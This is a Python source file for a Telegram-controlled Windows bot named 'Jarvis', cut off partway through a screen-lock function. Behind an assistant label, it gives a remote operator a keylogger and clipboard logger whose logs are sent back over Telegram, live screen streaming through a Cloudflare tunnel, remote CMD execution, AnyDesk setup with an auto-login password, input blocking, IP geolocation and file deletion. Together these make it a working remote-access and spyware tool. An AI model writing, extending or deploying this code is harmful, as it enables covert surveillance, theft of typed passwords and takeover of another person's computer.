from telegram import Update

def run_startup_diagnostics():
    import importlib
    import sys
    import platform
    import ctypes

    print("🧠 Running Jarvis Boot Check...\n")

    required_modules = {
        "psutil": "psutil",
        "platform": "platform",
        "ctypes": "ctypes",
        "asyncio": "asyncio",
        "getpass": "getpass",
        "socket": "socket",
        "GPUtil": "GPUtil",
        "speedtest-cli": "speedtest",  # pip name : import name
        "pillow": "PIL",
        "python-telegram-bot[job-queue]": "telegram"
    }

    for pip_name, import_name in required_modules.items():
        if importlib.util.find_spec(import_name) is None:
            print(f"❌ Module missing: {pip_name} (Run: pip install {pip_name})")
        else:
            print(f"✅ Module OK: {pip_name}")

    version = sys.version_info
    if version.major == 3 and version.minor >= 8:
        print(f"✅ Python Version: {version.major}.{version.minor}")
    else:
        print("⚠️ Python 3.8+ recommended.")

    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            print("✅ Admin Privilege: YES")
        else:
            print("❌ Admin Privilege: NO (Input blocking & system access may fail)")
    except:
        print("⚠️ Admin check failed.")

    print(f"🖥️ OS: {platform.system()} {platform.release()}")
    print("\n✅ Jarvis Boot Check Complete.\n")

from pynput import keyboard, mouse
import mss
from flask import Flask, Response
import threading
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, ContextTypes, filters
import os
import datetime
import requests
from geopy.geocoders import Nominatim
import subprocess  
import sys 
import asyncio
import pyautogui
import io
import glob
from telegram import InputFile
import psutil
import platform
import requests
import json
from scipy.io.wavfile import write
import re
import tkinter as tk
import multiprocessing
import os
import sys
import asyncio
import speech_recognition as sr
import shutil
import psutil
import socket
import GPUtil
import getpass
import wikipedia
import winreg
import requests
from datetime import datetime, timezone
import pytz
import logging
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
import webbrowser
import urllib.parse
import ctypes
import threading
import time
import speedtest
import importlib
import sys
import platform
import cv2
import numpy as np
from pynput import keyboard


keylog_listener = None
keylog_active = False
input_block_active = False
input_block_lock = threading.Lock()



with open('config.json', 'r') as config_file:
    config = json.load(config_file)

# Access the values
API_KEY = config['API_KEY']
BASE_URL = config['BASE_URL']
BOT_TOKEN = config['BOT_TOKEN']
USER_ID = config['USER_ID']
EMAIL_PASSWORD = config['EMAIL_PASSWORD']
PASSWORD = config['PASSWORD']
JARVIS_PASSWORD = config['PASSWORD_DESTROY']
ANYDESK_PASSWORD = config["ANYDESK_PASSWORD"]

run_startup_diagnostics()

app = ApplicationBuilder().token(BOT_TOKEN).build()







feature_list = """
Jarvis Features List:

1. /createnote - Create and save a text note on your PC.
2. /opencmd - Open Windows CMD and enter interactive mode.
3. /exitcmd - Exit CMD interactive mode.
4. /weather city - Get weather information for a city.
5. /location - Send your current location on Telegram.
6. /wikipedia query lang - Search Wikipedia in any language (default: en).
7. /reboot or /restart - Restart Jarvis bot.
8. /screenshot - Capture and send your screen screenshot.
9. /systeminfo - Show system info: OS, CPU, RAM, GPU, IP, hostname, etc.
10. /record minutes - Record audio and send to Telegram.
11. /install package - Install a Python module.
12. /uninstall package - Uninstall a Python module.
13. /moduleslist - List all installed Python modules.
14. /destroy password - Self-destruct Jarvis (needs password).
15. /shutdown time - Shutdown your PC.
16. /time - Show current system time and date.
17. /web query or url - Search Google or open a URL in your browser.
18. /closeweb - Force-close web browsers (Chrome, Edge, Firefox, etc.)
19. /screenlock <minutes> - Lock the screen (blocks input visually) for the specified time.
20. /screenunlock - Manually unlock the screen and restore input.
21. /speedtest - Show internet speed.
22. /installedapps - Show list of installed applications.
23. /startcapture - Start live stream of your screen via secure Cloudflare link.
24. /stopcapture - Stop the active screen stream.
25. /exit - Shut down the bot.
26. /anydesk - Download, launch AnyDesk, set auto-login password, and send access ID.
27. /stopanydesk - Force close AnyDesk and remove it from background.
28. /cleanup - Clean junk and temp files.
29. /startkeylog - Start background keylogging.
30. /stopkeylog - Stop keylogging.
31. /getkeylog - Get saved keystrokes as file.
32. /deletelogs - Delete the saved keystroke log (keys_log.txt).
33. /recordscreen <minutes> - Starts recording the screen and system audio together.
34. /deleterecord - delete recording
35. /stopinputs - stop inputs from user (keybouard & mouse) need admin rightes
36. /runningapps - running apps list
37. /killprocess <PID> - kill process with PID
38. /startclipboard & /stopclipboard & /getclipboardlog & /deleteclipboardlog
39. /delete <name> or <path> - delete specific file
40. /startsmartalerts & /stopalerts & /alertfile & /deletealerts - alerts
41. /getipinfo
"""














async def send_hello_message(context: ContextTypes.DEFAULT_TYPE):
    bot = context.bot  # Access the bot instance
    user_id = USER_ID  # Store the USER_ID here for easy access
    await bot.send_message(
        chat_id=user_id, text="Hello! Jarvis is online and ready to assist you. 😊"
    )
app.job_queue.run_once(send_hello_message, 1)









# Stream Setup
STREAM_LINK = None
TUNNEL_PROCESS = None
BOT_RUNNING = False
app_stream = Flask(__name__)

def generate_frames():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
            frame_bytes = buffer.tobytes()
            yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')

@app_stream.route('/live')
def live_stream():
    print("[INFO] /live stream accessed")
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


def run_flask_app():
    app_stream.run(host="0.0.0.0", port=5000)

async def start_capture(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global TUNNEL_PROCESS, STREAM_LINK, BOT_RUNNING

    if BOT_RUNNING:
        await update.message.reply_text("🚫 Stream already running.")
        return

    await update.message.reply_text("🚀 Starting screen stream...")

    # Start Flask server in background
    flask_thread = threading.Thread(target=run_flask_app, daemon=True)
    flask_thread.start()
    await asyncio.sleep(2)  # Give Flask time to bind port

    # Start Cloudflare Tunnel
    try:
        TUNNEL_PROCESS = subprocess.Popen(
            [r"C:\Users\nilke\Downloads\telegram\cloudflared-windows-amd64.exe", "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        while True:
            line = TUNNEL_PROCESS.stdout.readline()
            print("[cloudflared]", line.strip())
            match = re.search(r"(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)", line)
            if match:
                STREAM_LINK = match.group(1)
                break

        BOT_RUNNING = True
        await update.message.reply_text(f"📡 Live stream link:\n{STREAM_LINK}/live")

    except Exception as e:
        await update.message.reply_text(f"❌ Error starting stream: {e}")


async def stop_capture(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global TUNNEL_PROCESS, BOT_RUNNING

    if TUNNEL_PROCESS:
        TUNNEL_PROCESS.kill()
        TUNNEL_PROCESS = None

    BOT_RUNNING = False
    await update.message.reply_text("🛑 Screen stream stopped.")







async def list_installed_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        apps = []

        uninstall_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            for key_path in uninstall_keys:
                try:
                    with winreg.OpenKey(root, key_path) as key:
                        for i in range(0, winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    apps.append(name)
                            except Exception:
                                continue
                except Exception:
                    continue

        if not apps:
            await update.message.reply_text("⚠️ No installed applications found.")
            return

        apps.sort()
        text = "📦 *Installed Applications:*\n\n" + "\n".join(f"- {a}" for a in apps[:100])

        # If too many, send as file
        if len(apps) > 100:
            file_name = "installed_apps.txt"
            with open(file_name, "w", encoding="utf-8") as f:
                f.write("\n".join(apps))
            await update.message.reply_document(document=open(file_name, "rb"))
        else:
            await update.message.reply_text(text, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")









async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Send the feature list to the user
        await update.message.reply_text(feature_list)
    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred while fetching the feature list: {e}")






async def cleanup_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        patterns = ["*.jpg", "*.png", "*.txt", "*.log", "__pycache__"]
        deleted = []

        for pattern in patterns:
            for file in glob.glob(pattern):
                try:
                    os.remove(file)
                    deleted.append(file)
                except:
                    pass

        await update.message.reply_text(f"🧼 Cleanup complete.\n🗑️ Files removed: {len(deleted)}")
    except Exception as e:
        await update.message.reply_text(f"❌ Cleanup failed: {e}")


import psutil
import pygetwindow as gw
from telegram import Update
from telegram.ext import ContextTypes


async def handle_running_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        apps = {}

        # List all running processes using psutil
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                process_pid = proc.info['pid']
                process_name = proc.info['name']

                # Group PIDs by process name
                if process_name not in apps:
                    apps[process_name] = []
                apps[process_name].append(process_pid)

            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if not apps:
            await update.message.reply_text("📭 No visible running apps found.")
        else:
            # Prepare response text
            response = "🖥️ Running Applications:\n\n"
            for process_name, pids in apps.items():
                # Show only one entry per app, displaying all associated PIDs
                response += f"{process_name} - PIDs: {', '.join(map(str, pids))}\n"

            # Send long message in chunks if it's too long
            await send_long_message(update, response)

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def send_long_message(update, text: str):
    # Split text into chunks of 4096 characters
    chunk_size = 4096
    for i in range(0, len(text), chunk_size):
        await update.message.reply_text(text[i:i + chunk_size])








import pyperclip
import threading
import time

clipboard_monitoring = False
clipboard_thread = None
last_clipboard_content = ""

def clipboard_monitor():
    global clipboard_monitoring, last_clipboard_content
    while clipboard_monitoring:
        try:
            content = pyperclip.paste()
            if content and content != last_clipboard_content:
                last_clipboard_content = content
                # Format the current timestamp in 12-hour format
                timestamp = time.strftime("%a %b %d %I:%M:%S %p %Y")
                with open("clipboard_log.txt", "a", encoding="utf-8") as f:
                    f.write(f"{timestamp}:\n{content}\n\n")
            time.sleep(1)
        except Exception as e:
            print(f"Clipboard error: {e}")
            time.sleep(1)
async def handle_start_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global clipboard_monitoring, clipboard_thread
    if clipboard_monitoring:
        await update.message.reply_text("⚠️ Clipboard monitoring is already running.")
        return
    clipboard_monitoring = True
    clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True)
    clipboard_thread.start()
    await update.message.reply_text("✅ Clipboard monitoring started in background.")

async def handle_stop_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global clipboard_monitoring
    if clipboard_monitoring:
        clipboard_monitoring = False
        await update.message.reply_text("🛑 Clipboard monitoring stopped.")
    else:
        await update.message.reply_text("⚠️ Clipboard monitoring is not active.")
async def handle_get_clipboard_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.path.exists("clipboard_log.txt"):
            with open("clipboard_log.txt", "rb") as f:
                await update.message.reply_document(f, filename="clipboard_log.txt")
        else:
            await update.message.reply_text("📭 Clipboard log file not found.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error sending clipboard log: {e}")
async def handle_delete_clipboard_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.path.exists("clipboard_log.txt"):
            os.remove("clipboard_log.txt")
            await update.message.reply_text("✅ Clipboard log file deleted.")
        else:
            await update.message.reply_text("📭 Clipboard log file does not exist.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error deleting clipboard log: {e}")

























import psutil
from telegram import Update
from telegram.ext import CommandHandler, Application, ContextTypes

async def kill_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /killprocess <process_name>")
        return

    process_name = context.args[0].lower()  # Get process name from user input

    try:
        # List all running processes
        killed_pids = []
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name:  # Match process name (case insensitive)
                try:
                    proc.terminate()  # Try to gracefully terminate the process
                    proc.wait(timeout=3)  # Wait for process termination
                    killed_pids.append(proc.info['pid'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                except psutil.TimeoutExpired:
                    continue

        if killed_pids:
            await update.message.reply_text(f"✅ The following {process_name} processes were terminated successfully: \n" +
                                          '\n'.join([f"PID: {pid}" for pid in killed_pids]))
        else:
            await update.message.reply_text(f"❌ No processes found for {process_name}.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


















async def handle_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("❌ Usage: /shutdown <minutes or seconds>\nExample: /shutdown 1.5")
            return

        value = float(context.args[0])
        seconds = int(value * 60)

        os.system(f"shutdown /s /t {seconds}")
        await update.message.reply_text(f"🛑 Shutdown scheduled in {seconds} seconds.\nUse /cancelshutdown to abort.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
async def handle_cancel_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        os.system("shutdown /a")
        await update.message.reply_text("❎ Shutdown cancelled successfully.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")






# Command to install a package
async def install_package_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) == 0:
            await update.message.reply_text("⚠️ Usage: /install <package_name>")
            return

        package = " ".join(context.args)

        # Clear the pip cache to ensure fresh install
        subprocess.run([sys.executable, "-m", "pip", "cache", "purge"], capture_output=True, text=True)

        # Install the package
        process = subprocess.run(
            [sys.executable, "-m", "pip", "install", package],
            capture_output=True, text=True
        )

        # Check if the package was successfully installed or already exists
        if "Requirement already satisfied" in process.stdout:
            await update.message.reply_text(f"✅ `{package}` is already installed!")
        elif process.returncode == 0:
            await update.message.reply_text(f"✅ Installed `{package}` successfully!")
        else:
            await update.message.reply_text(f"❌ Error:\n{process.stderr}")
    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred while installing the package:\n{e}")


# Command to uninstall a package
async def uninstall_package_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) == 0:
            await update.message.reply_text("⚠️ Usage: /uninstall <package_name>")
            return

        package = " ".join(context.args)

        # Uninstall the package
        process = subprocess.run(
            [sys.executable, "-m", "pip", "uninstall", "-y", package],
            capture_output=True, text=True
        )

        # Check if the package was successfully uninstalled
        if "Successfully uninstalled" in process.stdout:
            await update.message.reply_text(f"✅ Uninstalled `{package}` successfully!")
        elif "not installed" in process.stdout:
            await update.message.reply_text(f"❌ `{package}` is not installed!")
        else:
            await update.message.reply_text(f"❌ Error:\n{process.stderr}")
    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred while uninstalling the package:\n{e}")

async def modules_list_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Run pip list to get installed modules
        process = subprocess.run(
            [sys.executable, "-m", "pip", "list"],
            capture_output=True, text=True
        )

        if process.returncode == 0:
            installed_modules = process.stdout
            await update.message.reply_text(f"📦 Installed Modules:\n```\n{installed_modules}\n```", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ Error fetching the list of installed modules:\n{process.stderr}")
    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred while fetching installed modules:\n{e}")




def on_press(key):
    with open("keys_log.txt", "a", encoding="utf-8") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key.name.upper()}] ")
async def start_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylog_listener, keylog_active
    if keylog_active:
        await update.message.reply_text("🟡 Keylogger already running.")
        return
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_active = True
    await update.message.reply_text("🔴 Keylogger started.")
async def stop_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylog_listener, keylog_active
    if keylog_listener:
        keylog_listener.stop()
        keylog_listener = None
        keylog_active = False
        await update.message.reply_text("🟢 Keylogger stopped.")
    else:
        await update.message.reply_text("⚪ Keylogger was not running.")
async def send_keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists("keys_log.txt"):
        await update.message.reply_document(document=open("keys_log.txt", "rb"))
    else:
        await update.message.reply_text("📁 No keylog file found.")
async def delete_keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        log_file = "keys_log.txt"
        if os.path.exists(log_file):
            os.remove(log_file)
            await update.message.reply_text("🗑️ Keylogger log deleted successfully.")
        else:
            await update.message.reply_text("📂 No keylog file found to delete.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to delete log file: {e}")








async def handle_time_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        now = datetime.now()
        time_str = f"Time: {now.strftime('%I:%M %p')}\nDate: {now.strftime('%d-%m-%Y')}"
        await update.message.reply_text(time_str)
    except Exception as e:
        await update.message.reply_text(f"Failed to fetch time: {e}")









async def handle_open_web(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /web <search text or URL>")
        return

    query = " ".join(context.args).strip()
    
    # If user enters valid http/https URL, open as-is, else treat it as search
    if query.startswith("http://") or query.startswith("https://"):
        url = query
    else:
        # Encode query and prepare Google search URL
        search_query = urllib.parse.quote_plus(query)
        url = f"https://www.google.com/search?q={search_query}"

    try:
        webbrowser.open(url)
        await update.message.reply_text(f"✅ Opened: {query}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to open web search: {e}")



async def handle_close_web(update: Update, context: ContextTypes.DEFAULT_TYPE):
    browser_names = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe"]  # Customize as needed
    closed = []

    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() in browser_names:
                proc.kill()
                closed.append(proc.info['name'])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    if closed:
        await update.message.reply_text(f"✅ Closed: {', '.join(set(closed))}")
    else:
        await update.message.reply_text("⚠️ No supported browser processes were found running.")







import os
import time
import threading
import pythoncom
import wmi
from telegram import Update
from telegram.ext import CommandHandler, Application, ContextTypes

alerts_active = False
alert_thread = None
alert_log_file = "alert_log.txt"

# Sets to track previously seen devices
seen_usb = set()
seen_bluetooth = set()
seen_network = set()
seen_audio = set()

# Function to log events to the alert log file
def log_event(message):
    # Check if the log file exists, if not, create it
    if not os.path.exists(alert_log_file):
        with open(alert_log_file, "w", encoding="utf-8") as f:
            f.write("Alert Log Initialized.\n")  # Optional message when file is created

    with open(alert_log_file, "a", encoding="utf-8") as f:
        timestamp = time.strftime('%Y-%m-%d %I:%M:%S %p')
        f.write(f"{timestamp} - {message}\n")

def monitor_usb_devices(c):
    global seen_usb
    try:
        current_usb = set()
        usb_devices = c.query("SELECT * FROM Win32_USBHub")
        for device in usb_devices:
            name = device.Name
            if name not in seen_usb:
                log_event(f"USB Device Connected: {name}")
            current_usb.add(name)
        seen_usb = current_usb
    except Exception as e:
        log_event(f"Error monitoring USB: {e}")

def monitor_bluetooth_connections(c):
    global seen_bluetooth
    try:
        current_bt = set()
        devices = c.query("SELECT * FROM Win32_PnPEntity")
        for device in devices:
            if device.Description and "Bluetooth" in device.Description:
                desc = device.Description
                if desc not in seen_bluetooth:
                    log_event(f"Bluetooth Device: {desc}")
                current_bt.add(desc)
        seen_bluetooth = current_bt
    except Exception as e:
        log_event(f"Error monitoring Bluetooth: {e}")

def monitor_network_adapters(c):
    global seen_network
    try:
        current_net = set()
        adapters = c.query("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus=2")
        for adapter in adapters:
            name = adapter.Name
            lname = name.lower()
            label = ""
            if "wi-fi" in lname or "wireless" in lname:
                label = f"Wi-Fi Connected: {name}"
            elif "ethernet" in lname:
                label = f"Ethernet Connected: {name}"
            if label and label not in seen_network:
                log_event(label)
            if label:
                current_net.add(label)
        seen_network = current_net
    except Exception as e:
        log_event(f"Error monitoring network: {e}")

def monitor_audio_devices(c):
    global seen_audio
    try:
        current_audio = set()
        devices = c.query("SELECT * FROM Win32_SoundDevice")
        for device in devices:
            name = device.Name
            if name not in seen_audio:
                log_event(f"Audio Device Active: {name}")
            current_audio.add(name)
        seen_audio = current_audio
    except Exception as e:
        log_event(f"Error monitoring audio: {e}")

def start_monitoring_alerts():
    global alerts_active
    pythoncom.CoInitialize()
    c = wmi.WMI()
    while alerts_active:
        monitor_usb_devices(c)
        monitor_bluetooth_connections(c)
        monitor_network_adapters(c)
        monitor_audio_devices(c)
        time.sleep(10)
    pythoncom.CoUninitialize()

async def start_smart_alerts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global alerts_active, alert_thread
    if alerts_active:
        await update.message.reply_text("⚠️ Smart Alerts are already running.")
        return
    # Check if the alert log file exists and create it if not
    if not os.path.exists(alert_log_file):
        log_event("Alert Log Initialized.")

    alerts_active = True
    alert_thread = threading.Thread(target=start_monitoring_alerts, daemon=True)
    alert_thread.start()
    await update.message.reply_text("✅ Smart Alerts started.")

async def stop_smart_alerts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global alerts_active
    if not alerts_active:
        await update.message.reply_text("⚠️ Smart Alerts are not running.")
        return
    alerts_active = False
    await update.message.reply_text("🛑 Smart Alerts stopped.")

async def get_alert_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(alert_log_file):
        with open(alert_log_file, "rb") as f:
            await update.message.reply_document(f, filename=alert_log_file)
    else:
        await update.message.reply_text("❌ No alert log file found.")

async def delete_alert_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(alert_log_file):
        os.remove(alert_log_file)
        await update.message.reply_text("✅ Alert log file has been deleted.")
    else:
        await update.message.reply_text("❌ No alert log file found to delete.")












def get_location():
    try:
        # Using ipinfo.io to get location
        res = requests.get("https://ipinfo.io")
        if res.status_code == 200:  # Check if the request was successful
            data = res.json()

            # Extracting coordinates
            location = data['loc'].split(',')
            latitude = location[0]
            longitude = location[1]

            print(f"Retrieved coordinates: Latitude: {latitude}, Longitude: {longitude}")
            return latitude, longitude
        else:
            print(f"Error getting location: Received status code {res.status_code}")
            return None, None
    except Exception as e:
        print(f"Error getting location: {e}")
        return None, None

# Async function to send location to Telegram
async def send_location_telegram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📍 Getting your current location...")

    # Blocking call to get location (still uses requests)
    location = get_location()

    # If location is successfully retrieved, send it to Telegram
    if location:
        latitude, longitude = location
        await update.message.reply_location(latitude=latitude, longitude=longitude)
        await update.message.reply_text(f"✅ Location sent to Telegram!\nLatitude: {latitude}\nLongitude: {longitude}")
    else:
        await update.message.reply_text("❌ Could not retrieve location.")

# Command handler to trigger location fetching
async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_location_telegram(update, context)











# Save note content to a text file
def save_note_to_file(content, file_name):
    try:
        with open(file_name, "a", encoding="utf-8") as file:
            file.write(content + "\n")
    except Exception as e:
        print(f"Error saving note: {e}")
async def start_note_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['note_state'] = 'awaiting_filename'
    await update.message.reply_text("📝 Please send the *file name* (without `/`).", parse_mode="Markdown")
async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user_id = update.message.from_user.id
    user = user_data.get(user_id, {})
    note_state = context.user_data.get('note_state')

    # CMD mode
    if user.get("cmd_mode"):
        if user_input.lower() in ["exit", "exitcmd", "stop cmd"]:
            user["cmd_mode"] = False
            process = user.get("process")
            if process:
                process.kill()
            await update.message.reply_text("🚪 Exited CMD mode.")
        else:
            output = await execute_cmd_command(user_input, user["process"])
            await update.message.reply_text(f"📤 Output:\n{output}")
        return

    # Note: awaiting filename
    if note_state == 'awaiting_filename':
        file_name = user_input if user_input.endswith('.txt') else user_input + '.txt'
        context.user_data['file_name'] = file_name
        context.user_data['note_state'] = 'awaiting_content'
        await update.message.reply_text(f"✅ File name set as *{file_name}*.\nNow send the *note content*.", parse_mode="Markdown")
        return

    # Note: awaiting content
    elif note_state == 'awaiting_content':
        file_name = context.user_data.get('file_name', 'note.txt')
        save_note_to_file(user_input, file_name)
        context.user_data['note_state'] = None
        await update.message.reply_text(f"✅ Your note has been saved to *{file_name}*.", parse_mode="Markdown")
        return

    # Fallback
    await update.message.reply_text("❓ Unknown command or message. Please use valid commands.")







import os
import shutil
import subprocess
import psutil
from telegram import Update
from telegram.ext import CommandHandler, Application, ContextTypes

# Function to check if any process is using the file or folder
def is_file_or_folder_in_use(path):
    for proc in psutil.process_iter(['pid', 'name', 'open_files']):
        try:
            for file in proc.info['open_files'] or []:
                if file.path == path:
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False

# Function to delete the file/folder using PowerShell if normal deletion fails
def delete_using_powershell(path):
    try:
        subprocess.run(["powershell", "-Command", f"Remove-Item -Path '{path}' -Recurse -Force"], check=True)
        return True
    except subprocess.CalledProcessError:
        return False

# Function to search for a file by name across all available drives
def search_file_by_name(file_name):
    drives = ['C:/', 'D:/', 'E:/', 'F:/']  # Specify the drives to search (add more if needed)
    
    for drive in drives:
        for root, dirs, files in os.walk(drive):  # Search recursively in each drive
            if file_name in files:
                return os.path.join(root, file_name)
    return None

# /delete command to delete a specific file or folder
async def handle_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /delete <file_name or full_path>")
        return

    # Get the file name or full path
    path_input = context.args[0]

    # If it's a full path, try deleting directly
    if os.path.isabs(path_input):
        path = path_input
    else:
        # If it's just the file name, we will search for it across all drives
        path = search_file_by_name(path_input)

    # If the path is not found, notify the user
    if not path:
        await update.message.reply_text(f"❌ No file/folder found with the name *{path_input}*.")
        return

    # Check if the path is a file or a directory
    if os.path.isdir(path):
        # Handle directory (folder) deletion
        if is_file_or_folder_in_use(path):
            await update.message.reply_text(f"❌ Folder *{path}* is currently in use by another process.")
            return
        try:
            shutil.rmtree(path)  # Delete folder and its contents
            await update.message.reply_text(f"✅ Folder *{path}* has been deleted.", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error deleting folder: {e}")
    elif os.path.isfile(path):
        # Handle file deletion
        if is_file_or_folder_in_use(path):
            await update.message.reply_text(f"❌ File *{path}* is currently in use by another process.")
            return
        try:
            os.remove(path)  # Delete the file
            await update.message.reply_text(f"✅ File *{path}* has been deleted.", parse_mode="Markdown")
        except PermissionError:
            # If permission error, try deleting using PowerShell
            if delete_using_powershell(path):
                await update.message.reply_text(f"✅ File *{path}* deleted using PowerShell.")
            else:
                await update.message.reply_text(f"❌ Error deleting file: {path}. Permission denied.")
        except Exception as e:
            await update.message.reply_text(f"❌ Error deleting file: {e}")
    else:
        await update.message.reply_text(f"❌ The specified path *{path}* is neither a file nor a folder.")











async def handle_speedtest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⏳ Running speed test. Please wait...")

    try:
        st = speedtest.Speedtest()
        st.get_best_server()

        download_speed = st.download() / 1_000_000  # Convert to Mbps
        upload_speed = st.upload() / 1_000_000      # Convert to Mbps
        ping = st.results.ping

        result = f"""📶 *Speed Test Results:*
📥 Download: {download_speed:.2f} Mbps
📤 Upload: {upload_speed:.2f} Mbps
📡 Ping: {ping:.0f} ms"""

        await update.message.reply_text(result, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to run speed test:\n{e}")









# === Globals ===
input_block_active = False
input_block_lock = threading.Lock()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def block_input(state: bool):
    try:
        ctypes.windll.user32.BlockInput(state)
    except Exception as e:
        print(f"BlockInput failed: {e}")

def input_blocker():
    while True:
        time.sleep(0.1)
        with input_block_lock:
            if input_block_active:
                ctypes.windll.user32.BlockInput(True)
            else:
                ctypes.windll.user32.BlockInput(False)

threading.Thread(target=input_blocker, daemon=True).start()

async def handle_stop_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global input_block_active

    # Check for admin rights
    if not is_admin():
        await update.message.reply_text("⚠️ Admin rights required to block input.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /stopinputs <minutes>\nExample: /stopinputs 0.1 = 6 seconds")
        return

    try:
        minutes = float(context.args[0])
        seconds = minutes * 60

        # Activate input block in background thread
        with input_block_lock:
            input_block_active = True

        await update.message.reply_text(f"🛑 Input is blocked for {seconds:.0f} seconds...")

        # Wait async while other bot tasks continue
        await asyncio.sleep(seconds)

        # Deactivate input block
        with input_block_lock:
            input_block_active = False

        await update.message.reply_text("✅ Input is now unblocked.")

    except Exception as e:
        with input_block_lock:
            input_block_active = False
        await update.message.reply_text(f"❌ Error: {e}")






















overlay_process = None

def show_overlay():
    window = tk.Tk()
    window.attributes("-fullscreen", True)
    window.configure(bg="black")
    window.attributes("-topmost", True)
    window.protocol("WM_DELETE_WINDOW", lambda: None)
    window.bind("<Key>", lambda e: "break")
    window.bind("<Button>", lambda e: "break")
    tk.Label(window, text="🔒 LOCKED", fg="white", bg="black", font=("Arial", 40)).pack(expand=True)
    window.mainloop()

def start_overlay():
    global overlay_process
    if overlay_process is None or not overlay_process.is_alive():
        overlay_process = multiprocessing.Process(target=show_overlay)
        overlay_process.start()

def stop_overlay():
    global overlay_process
